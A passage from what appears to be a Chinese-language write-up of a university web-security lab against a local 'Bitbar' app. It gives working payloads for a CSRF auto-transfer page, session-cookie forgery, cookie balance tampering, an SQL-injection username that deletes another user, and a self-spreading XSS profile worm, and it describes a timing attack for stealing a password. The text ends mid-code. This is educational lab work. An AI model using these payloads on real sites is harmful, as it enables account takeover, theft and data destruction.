<p>可以看到method为POST，表单有两个表项“destination_uesrname”和“quantity”，所以攻击者的表单也需要向服务器发送相同的表项。通过wireshark抓包也可以查看表单结构：<br>正常转发表单：<br><img src="/figure/attack2_1.png" alt="attack2_1"></p>
<p>抓包查看表单信息：<br><img src="/figure/attack2_2.png" alt="attack2_2"> </p>
<h5 id="伪造请求"><a href="#伪造请求" class="headerlink" title="伪造请求"></a>伪造请求</h5><p>当用户点击网页时，网页加载过程中会执行 transfer 表单的提交，然后立刻跳转至 cs155.stanford.edu。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&#x27;utf-8&#x27;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> hit=<span class="literal">false</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">function</span> <span class="title function_">load</span>(<span class="params"></span>)&#123;  </span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;csrf&#x27;</span>).<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript">                hit=<span class="literal">true</span>;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">function</span> <span class="title function_">redirect</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">if</span>(hit)&#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="variable language_">window</span>.<span class="property">location</span>.<span class="title function_">replace</span>(<span class="string">&quot;https://cs155.stanford.edu&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">&quot;load()&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;csrf&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">target</span>=<span class="string">&quot;iframe&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://localhost:3000/post_transfer&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;destination_username&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">value</span>=<span class="string">&quot;attacker&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;quantity&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">value</span>=<span class="string">&quot;10&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">style</span>=<span class="string">&quot;display:none;&quot;</span> <span class="attr">name</span>=<span class="string">&quot;iframe&quot;</span> <span class="attr">onload</span>=<span class="string">&quot;redirect()&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span> <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>代码有两个部分：</p>
<ol>
<li>JavaScript脚本：</li>
</ol>
<ul>
<li>定义了一个变量 hit，初始值为 false。这个变量用来标记表单是否已经提交。</li>
<li>load() 函数：当页面加载完成时，这个函数会被调用（ <code>&lt;body onload=&quot;load()&quot;&gt;</code>）。它执行两个操作：</li>
<li>自动提交名为 csrf 的表单。</li>
<li>将 hit 变量的值设置为 true，表示表单已提交。</li>
<li>redirect() 函数：这个函数会在 iframe 加载完成后调用（<code>&lt;iframe onload=&quot;redirect()&quot;&gt;</code>）。如果 hit 为 true（即表单已提交），则页面会重定向到 “<a target="_blank" rel="noopener" href="https://cs155.stanford.edu"./">https://cs155.stanford.edu&quot;。</a></li>
</ul>
<ol start="2">
<li>表单和iframe：</li>
</ol>
<ul>
<li><code>&lt;form&gt;</code> 标签定义了一个表单，其 id 为 csrf，方法为 POST，目标为 iframe，动作为提交到 “<a target="_blank" rel="noopener" href="http://localhost:3000/post_transfer%22%E3%80%82%E8%A1%A8%E5%8D%95%E5%8C%85%E5%90%AB%E4%B8%A4%E4%B8%AA%E9%9A%90%E8%97%8F%E7%9A%84%E8%BE%93%E5%85%A5%E5%AD%97%E6%AE%B5%EF%BC%9Adestination_username">http://localhost:3000/post_transfer&quot;。表单包含两个隐藏的输入字段：destination_username</a> 和 quantity，分别设置为 “attacker” 和 “10”。</li>
<li><code>&lt;iframe&gt;</code> 标签定义了一个不可见的iframe（通过 style&#x3D;”display:none;”），用作表单提交的目标。当表单提交到这个iframe时，不会导致页面的可见部分发生变化，但会触发 onload 事件，从而调用 redirect() 函数。</li>
</ul>
<p>运行过程如下：<br>窃取前的user1:<br><img src="/figure/attack2_3.png" alt="attack2_3"> </p>
<p>运行b.html后，跳转到cs155页面，并且也不会显示localhost:3000：<br><img src="/figure/attack2_4.png" alt="attack2_4"> </p>
<p>查看user1的bitbar数量：<br><img src="/figure/attack2_5.png" alt="attack2_5"> </p>
<p>窃取成功。</p>
<h3 id="漏洞利用Charlie-：使用-Cookie-进行会话劫持"><a href="#漏洞利用Charlie-：使用-Cookie-进行会话劫持" class="headerlink" title="漏洞利用Charlie ：使用 Cookie 进行会话劫持"></a>漏洞利用Charlie ：使用 Cookie 进行会话劫持</h3><h4 id="实验任务说明-1"><a href="#实验任务说明-1" class="headerlink" title="实验任务说明"></a>实验任务说明</h4><p>在第三次攻击中，您需要通过劫持受害者的会话cookie来欺骗 Bitbar 应用程序，使其认为您是以不同的用户身份登录的。在攻击开始时，您将以攻击者身份登录，您需要让 Bitbar 相信您是 user1 而不是 attacker，这样您就可以将 attacker 的 Bitbar 转移到您的攻击中。<br>您的解决方案将是一个 Javscript 文件（c.txt），可以复制&#x2F;粘贴到浏览器的 Javscript 控制台。在控制台中执行 Javscript 后，Bitbar 应显示用户 1 已登录，而不是攻击者账户，而且您应能在 Web UI 中将 10 个 Bitbar 从用户 1 转移到攻击者。用户 attacker 的密码是 evil。用户 1 的 ID 是 one。<br><strong>交付和评分：</strong> 您必须提交一个 c.txt 文件，其中包含要在 Javascript 控制台中执行的JavaScript。您可以假设评分员将运行您的攻击，同时数据库中的原始用户 user1 具有 200 Bitbars。运行 JavaScript 并刷新页面后，应用程序必须以 user1 的身份登录，并且必须允许评分员将 Bitbars 转入攻击者账户。<br><em>提示：</em> 网站如何存储会话？</p>
<h4 id="实验原理-2"><a href="#实验原理-2" class="headerlink" title="实验原理"></a>实验原理</h4><h5 id="会话劫持"><a href="#会话劫持" class="headerlink" title="会话劫持"></a>会话劫持</h5><p>会话劫持（Session hijacking）是一种通过获取用户Session ID后，使用该Session ID登录目标账号的攻击方法，此时攻击者实际上是使用了目标账户的有效Session。会话劫持的第一步是取得一个合法的会话标识来伪装成合法用户。Session ID一般都存储在cookie中。</p>
<p>步骤：</p>
<ol>
<li>目标用户需要先登录站点</li>
<li>登录成功后，该用户会得到站点提供的一个会话标识SessionID</li>
<li>攻击者通过某种攻击手段捕获Session ID</li>
<li>攻击者通过捕获到的Session ID访问站点即可获得目标用户合法会话<br><img src="/figure/attack3_%E5%8E%9F%E7%90%861.png" alt="attack3_原理1"></li>
</ol>
<p>获取cookie：</p>
<ul>
<li>了解cookie接口：找到Session ID位置进行破解</li>
<li>暴力破解：尝试各种Session ID，直到破解为止</li>
<li>预测：如果Session ID使用非随机的方式产生，那么就有可能计算出来</li>
<li>窃取：XSS攻击、使用网络嗅探（中间人攻击）等方法获得</li>
</ul>
<p>XSS攻击劫持cookie：<br><img src="/figure/attack3_%E5%8E%9F%E7%90%862.png" alt="attack3_原理2"></p>
<h4 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h4><ol>
<li>登陆attacker，获取cookie</li>
<li>用base64解码cookie</li>
<li>将解码的表单中的用户修改为user1，bitbar数量改为user1的bitbar数量</li>
<li>将修改后的表单进行base64编码，伪造user1的cookie<br><img src="/figure/attack3_1.png" alt="attack3_1"></li>
</ol>
<p>整理成js文件如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fakeInfo = &#123;</span><br><span class="line">    <span class="string">&quot;loggedIn&quot;</span> : <span class="literal">true</span>,</span><br><span class="line">    <span class="string">&quot;account&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span> : <span class="string">&quot;user1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;hashedPassword&quot;</span> : <span class="string">&quot;8146ff33e815e1a08eae2b473bf2cca159582e434c52524c3325f06e8c2b80d9&quot;</span>,</span><br><span class="line">        <span class="string">&quot;salt&quot;</span>: <span class="string">&quot;1337&quot;</span>,</span><br><span class="line">        <span class="string">&quot;profile&quot;</span>:<span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;bitbars&quot;</span>: <span class="number">100</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> fakeInfoBase64 = <span class="title function_">btoa</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(fakeInfo))</span><br><span class="line"><span class="keyword">const</span> fakeCookie = <span class="string">&#x27;session=&#x27;</span>+ fakeInfoBase64;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">cookie</span> = fakeCookie;</span><br></pre></td></tr></table></figure>

<p>输入到命令行：<br><img src="/figure/attack3_2.png" alt="attack3_2"></p>
<p>运行后点击Transfer，可以看到用户为user1，并且可以将bitbar转给攻击者:<br><img src="/figure/attack3_3.png" alt="attack3_3"></p>
<h3 id="漏洞利用Delta-：使用-Cookies-篡改书签"><a href="#漏洞利用Delta-：使用-Cookies-篡改书签" class="headerlink" title="漏洞利用Delta ：使用 Cookies 篡改书签"></a>漏洞利用Delta ：使用 Cookies 篡改书签</h3><h4 id="实验任务说明-2"><a href="#实验任务说明-2" class="headerlink" title="实验任务说明"></a>实验任务说明</h4><p>在这次攻击中，你需要伪造 100 万个新的 Bitbar，而不是从其他用户那里窃取。具体来说，您需要开发一个 Javascript 利用程序，在完成任何小额交易（例如向用户 1 发送 1 Bitbar）后，您的账户余额会升至 100 万 Bitbar。<br>创建一个新用户，开始这次攻击。与“Charlie攻击”类似，您的解决方案也是Javscript代码（d.txt），可以在登录新账户后复制并粘贴到浏览器的 JavaScript 控制台中。将代码粘贴到控制台后，进行一笔小额交易即可将账户余额提升到 100 万比特。<br><strong>重要提示：</strong> 新余额必须在不同会话之间持续存在。注销并重新登录账户后，余额应为 100 万比特币。这样做的目的是在不影响其他用户的情况下凭空伪造 100 万比特币。对于无辜的接收者来说，这笔交易应该是完全有效的。<br><strong>交付和评分：</strong> 您将提交一个文本文件 d.txt，其中包含您的漏洞利用代码。评分者将创建一个新账户，将代码粘贴到浏览器控制台，向另一个用户发送 1 个比特条，并验证新账户是否包含 100 万个比特条。</p>
<h4 id="实验步骤-1"><a href="#实验步骤-1" class="headerlink" title="实验步骤"></a>实验步骤</h4><p>由于router在转账时，通过更新req.session.account.bitbars实现用户在数据库中bitbar的数量更新，因此，使用 JavaScript 恶意脚本修改 Cookie 即可。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Cooking_Books</span>(<span class="params"></span>)&#123; </span><br><span class="line">    <span class="keyword">var</span> sessionObj = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title function_">atob</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>.<span class="title function_">split</span>(<span class="string">&quot;=&quot;</span>)[<span class="number">1</span>]));</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">NUM</span> = <span class="number">1000000</span>;</span><br><span class="line">    sessionObj.<span class="property">account</span>.<span class="property">bitbars</span> = <span class="variable constant_">NUM</span> + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">var</span> sesh_string = <span class="title function_">btoa</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(sessionObj));</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">cookie</span> = <span class="string">&quot;session=&quot;</span> + sesh_string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行后向attacker转一个bitbar：<br><img src="/figure/attack4_1.png" alt="attack4_1"></p>
<p>运行后可以发现user1有1000000个bitbar：<br><img src="/figure/attack4_2.png" alt="attack4_2"></p>
<h3 id="漏洞利用Echo-：SQL-注入"><a href="#漏洞利用Echo-：SQL-注入" class="headerlink" title="漏洞利用Echo ：SQL 注入"></a>漏洞利用Echo ：SQL 注入</h3><h4 id="实验任务说明-3"><a href="#实验任务说明-3" class="headerlink" title="实验任务说明"></a>实验任务说明</h4><p>在此攻击中，您需要开发一个恶意用户名，该用户名可针对为 Bitbar 应用程序提供支持的后台数据库执行恶意 SQL。评分员将使用您提供的用户名创建一个新的用户账户，点击close，然后确认要删除当前账户。这样，user3 就会从数据库中删除。新用户账户也应删除，以便不留下攻击痕迹。所有其他账户都应保留。<br>您可以假设数据库中除您创建的用户名之外的所有其他用户名都是“非恶意”的。更具体地说，您可以假设它们不包含空格。<br><strong>交付和评分：</strong> 包含恶意用户名的文本文件 e.txt。评分员将关闭该账户，然后验证恶意账户和 user3 是否已从数据库中删除。<br><em>提示：</em> 如果在处理问题时弄乱了用户数据库，只需杀死 (ctrl-C) Docker 容器并重启服务器即可重置数据库。</p>
<h4 id="实验原理-3"><a href="#实验原理-3" class="headerlink" title="实验原理"></a>实验原理</h4><p>如果要在删除当前用户的同时也删除user3，需要使当前用户名为一个隐藏的SQL语句，在router的&#x2F;close中，这个语句将插入到 DELETE FROM Users WHERE username &#x3D;&#x3D; ”${req.session.account.username}”; 去删除当前用户和user3。因此需要先有一个”，对应第一个”，然后加上 𝑂𝑅 𝑢𝑠𝑒𝑟𝑛𝑎𝑚𝑒 𝐿𝐼𝐾𝐸 “𝑢𝑠𝑒𝑟3”;，这样当前一个表达式判断为假时就会user3删除，此外，可以加上#注释掉后续的所有条件，从而保证仅执行恶意操作。</p>
<h4 id="实验步骤-2"><a href="#实验步骤-2" class="headerlink" title="实验步骤"></a>实验步骤</h4><p>创建如下用户：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; OR username LIKE &quot;user3&quot;;#</span><br></pre></td></tr></table></figure>
<p><img src="/figure/attack5_1.png" alt="attack5_1"></p>
<p>删除后可以发现user3也一起被删除：<br><img src="/figure/attack5_2.png" alt="attack5_2"></p>
<h3 id="漏洞利用Foxtrot：简介蠕虫"><a href="#漏洞利用Foxtrot：简介蠕虫" class="headerlink" title="漏洞利用Foxtrot：简介蠕虫"></a>漏洞利用Foxtrot：简介蠕虫</h3><h4 id="实验任务说明-4"><a href="#实验任务说明-4" class="headerlink" title="实验任务说明"></a>实验任务说明</h4><p>在下一次攻击中，您需要开发一种与Samy Worm类似的蠕虫，它可以窃取Bitbar并传播到其他账户。具体来说，您需要编写一个profile，在访问时将登录用户的1个 Bitbar 转移给攻击者，并将当前用户的配置文件替换为自己的配置文件。<br>如果攻击者用户将其配置文件更改为您在解决方案中提供的配置文件，则会发生以下情况：</p>
<ol>
<li>当用户 1 查看攻击者的配置文件时，1 个 Bitbar 将从用户 1 转移到攻击者，同时用户 1 的配置文件将替换为您的解决方案配置文件。</li>
<li>稍后，如果用户 2 查看用户 1 的配置文件，1 个 Bitbar 将从用户 2 转移到攻击者，用户 2 的配置文件也将被替换，依此类推。</li>
<li>在查看受感染的配置文件时，无论相应用户的真实比特条余额是多少，比特条的数量都应显示为 10。这同样适用于攻击者。关于如何显示受感染配置文件的比特条以及如何构建攻击的一些提示：<br> （1）如果受感染的配置文件立即显示 10 个bitbar，而不是数到 10，则没有问题。<br> （2）如果蠕虫为受感染用户显示的比特条数数到 10 就没有问题。<br> （3）如果先将计数设置为 100，然后再设置为 10，则会有问题。<br> （4）如果新感染的用户只有在注销并重新登录后才能在个人资料中看到漏洞文本，则不会有问题。<br> （5）如果攻击者在看到自己受感染的配置文件时触发了漏洞，也没有问题。</li>
</ol>
<p>传输和应用应该相当快（15 秒以内）。在此期间，评分者不会点击任何地方。在传输和复制过程中，浏览器的位置栏应保持在：<a target="_blank" rel="noopener" href="http://localhost:3000/profile?username=x%EF%BC%8C%E5%85%B6%E4%B8%AD">http://localhost:3000/profile?username=x，其中</a> x 是正在查看其配置文件的用户。访问者不应看到任何额外的图形用户界面元素（如框架），正在查看个人资料的用户应显示有 10 个 Bitbars。</p>
<p><strong>交付和评分：</strong> 一个名为 f.txt 的文件，其中包含您的恶意配置文件。我们将把您的配置文件文本复制并粘贴到攻击者的配置文件中，然后使用评分者的受害者账户查看profile。然后，我们将使用更多账户查看受害者的profile，检查传输和复制情况。如果用户的账户中没有 Bitbar，则不会对您进行评分。</p>
<h4 id="实验原理-4"><a href="#实验原理-4" class="headerlink" title="实验原理"></a>实验原理</h4><h5 id="Samy-Worm"><a href="#Samy-Worm" class="headerlink" title="Samy Worm"></a>Samy Worm</h5><p>Samy Worm是一种XSS蠕虫，作者出于恶作剧，将其设计于在网络社交媒体MySpace上自传播，并将作者萨米本人自动添加为关注者。最终事态却发展失控，并导致作者入狱。自从发布该蠕虫一来，它就吸引了大量的媒体关注。</p>
<p>该蠕虫用JavaScript实现，利用储存型XSS漏洞传播。它在每个被感染的用户页面显示一行字串“but most of all, samy is my hero”，并将自己复制在该用户页面。当新的用户点击被感染的用户页面时，就会触发该程序在用户的浏览器中运行，导致蠕虫进一步传播，在该新用户主页上再度复制。在短短20小时内，从2005年10月4日发布起，超过一百万的用户都运行了该程序。这让该作者的账户在该社交网络上的关注量指数级增长，并让萨米蠕虫成为历史上传播速度最快的计算机病毒。</p>
<h4 id="实验步骤-3"><a href="#实验步骤-3" class="headerlink" title="实验步骤"></a>实验步骤</h4><p>该攻击需要通过在profile中编辑JavaScript代码实现蠕虫传播，同样可以先验证XSS攻击：</p>
<p>在 user1 的profile下添加：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&quot;Javascript code test&quot;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p><img src="/figure/attack6_1.png" alt="attack6_1"></p>
<p>查询user1的profile，js代码顺利执行：<br><img src="/figure/attack6_2.png" alt="attack6_2"></p>
<p>恶意代码功能如下：</p>
<ol>
<li>构造一个 XML 请求向 attacker 转账 1 bitbar；</li>
<li>转账成功后，再次构造 XML 请求到 set_profile 来篡改当前用户的profile；</li>
<li>为掩饰转账操作，还需要将当前界面的 bitbar 数量固定为 10。</li>
</ol>
<p>实现代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;span id=<span class="string">&quot;bitbar_count&quot;</span> <span class="keyword">class</span>=<span class="string">&quot;10&quot;</span>&gt;&lt;/span&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">	<span class="comment">// send 1 bitbar to the attacker</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">	<span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">	xhr.<span class="property">withCredentials</span> = <span class="literal">true</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> params = <span class="string">&#x27;destination_username=attacker&amp;quantity=1&#x27;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">	xhr.<span class="title function_">open</span>(<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;http://localhost:3000/post_transfer&#x27;</span>, <span class="literal">true</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">	xhr.<span class="title function_">setRequestHeader</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    xhr.<span class="title function_">send</span>(params);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">	<span class="comment">// after sending, change the viewer&#x27;s profile</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">	xhr.<span class="property">onload</span> = <span class="function">() =&gt;</span> &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">		<span class="keyword">var</span> viewerCookie = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title function_">atob</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>.<span class="title function_">substr</span>(<span class="number">8</span>)));</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">		<span class="keyword">var</span> worm = <span class="built_in">encodeURIComponent</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;profile&#x27;</span>).<span class="property">innerHTML</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">		<span class="keyword">var</span> wormXHR = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">		wormXHR.<span class="property">withCredentials</span> = <span class="literal">true</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">		<span class="keyword">var</span> wormParams = <span class="string">`new_profile=<span class="subst">$&#123;worm&#125;</span>`</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">		wormXHR.<span class="title function_">open</span>(<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;http://localhost:3000/set_profile&#x27;</span>, <span class="literal">true</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">		wormXHR.<span class="title function_">setRequestHeader</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">		wormXHR.<span class="title function_">send</span>(wormParams);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">	&#125;;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>将 attacker 账号的profile改为恶意代码：<br><img src="/figure/attack6_3.png" alt="attack6_3"></p>
<p>用user1查看attacker：<br><img src="/figure/attack6_4.png" alt="attack6_4"></p>
<p>user1被修改：<br><img src="/figure/attack6_5.png" alt="attack6_5"></p>
<p>用user2查看user1：<br><img src="/figure/attack6_6.png" alt="attack6_6"></p>
<p>user2被修改：<br><img src="/figure/attack6_7.png" alt="attack6_7"></p>
<p>用user3查看user2：<br><img src="/figure/attack6_8.png" alt="attack6_8"></p>
<p>user2被修改：<br><img src="/figure/attack6_9.png" alt="attack6_9"></p>
<h3 id="漏洞利用Gamma-：通过时序攻击提取密码"><a href="#漏洞利用Gamma-：通过时序攻击提取密码" class="headerlink" title="漏洞利用Gamma ：通过时序攻击提取密码"></a>漏洞利用Gamma ：通过时序攻击提取密码</h3><h4 id="实验任务说明-5"><a href="#实验任务说明-5" class="headerlink" title="实验任务说明"></a>实验任务说明</h4><p>时序攻击是一种侧信道攻击，攻击者试图通过分析系统执行操作所需的时间来提取数据。例如，与使用无效密码的请求相比，网络服务器响应包含有效密码的登录请求可能需要更长的时间。即使同源策略阻止攻击者直接查看登录请求的 HTML 响应，服务器响应所需的时间也可能泄露所提供的密码是正确还是错误。</p>
<p>在最后一个漏洞中，您将开发一种攻击，通过利用这种定时侧信道来确定另一个用户的密码。您将通过分析 Bitbar 登录页面响应正确密码和错误密码所需的时间，找到受害者密码。这样，攻击网站就可以利用访问攻击网站的网络浏览器，</p>
<p>对受害者网站发起字典攻击。攻击网站从不直接连接受害者网站，而是让访问的浏览器完成所有工作。</p>
<p>您需要创建一个恶意用户名，它由一个脚本组成，该脚本通过测试所提供字典中的密码来猜测 userx 的密码，并测量服务器对每个所提供密码的响应时间。您的脚本需要分析服务器对所提供列表中所有密码的响应时间，确定正确的密码并将其发送至：<a target="_blank" rel="noopener" href="http://localhost:3000/steal_password?password=%5Bpassword%5D&timeElapsed=%5Btime_elapsed%5D">http://localhost:3000/steal_password?password=[password]&amp;timeElapsed=[time_elapsed]</a> 。</p>
<p>您可以使用 CS155-proj2&#x2F;code&#x2F;gamma_starter.html 代码段作为攻击的起点。该代码段包括要尝试的密码字典。</p>
<p><strong>交付和评分：</strong> 您应提交一个名为 g.txt 的文件，其中包含恶意用户名脚本。为了对您的攻击进行评分，我们将以攻击者身份登录，进入传输页面，在用户名字段中输入您在解决方案中指定的恶意用户名脚本，并向其传输 10 个Bitbars。</p>
<p>如果评分员在执行攻击后以 userx 登录，则不会有任何问题，攻击可能需要几秒钟才能完全执行。在攻击过程中，评分员不会点击任何地方或离开传输网页。网站不应有任何可见的变化，传输页面上的蓝色错误信息应显示” 用户不存在”。</p>
<p><em>提示：</em> 确保使用回车键而不是引号进行攻击。计时侧信道可能很微妙。</p>
<p><strong>竞态条件：</strong> 根据你编写代码的方式，所有这些攻击都有可能出现影响攻击成功的竞态条件。在评分过程中，在评分员浏览器上失败的攻击将无法获得满分。为确保获得满分，应在发出向外网络请求后等待，而不是假定请求会立即发送。</p>
<h4 id="实验原理-5"><a href="#实验原理-5" class="headerlink" title="实验原理"></a>实验原理</h4><h5 id="时序攻击"><a href="#时序攻击" class="headerlink" title="时序攻击"></a>时序攻击</h5><p>时序攻击属于侧信道攻击&#x2F;旁路攻击(Side Channel Attack)，侧信道攻击是指利用信道外的信息，比如加解密的速度&#x2F;加解密时芯片引脚的电压&#x2F;密文传输的流量和途径等进行攻击的方式，一个词形容就是“旁敲侧击”。比如，某个函数负责比较用户输入的密码和存放在系统内密码是否相同，如果该函数是从第一位开始比较，发现不同就立即返回，那么通过计算返回的速度就知道了大概是哪一位开始不同的，这样就实现了电影中经常出现的按位破解密码的场景。</p>
<h4 id="实验步骤-4"><a href="#实验步骤-4" class="headerlink" title="实验步骤"></a>实验步骤</h4><p>router在\get_login中处理用户登录信息时，当用户身份验证失败时会直接返回并渲染失败信息，而不会进行其他操作；当用户信息验证成功时，执行<code>await sleep(2000);</code>，使得进程休眠 2000 ms(2s)。此外，还需要对gamma_starter.html进行分析：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">&#x27;display:none&#x27;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span 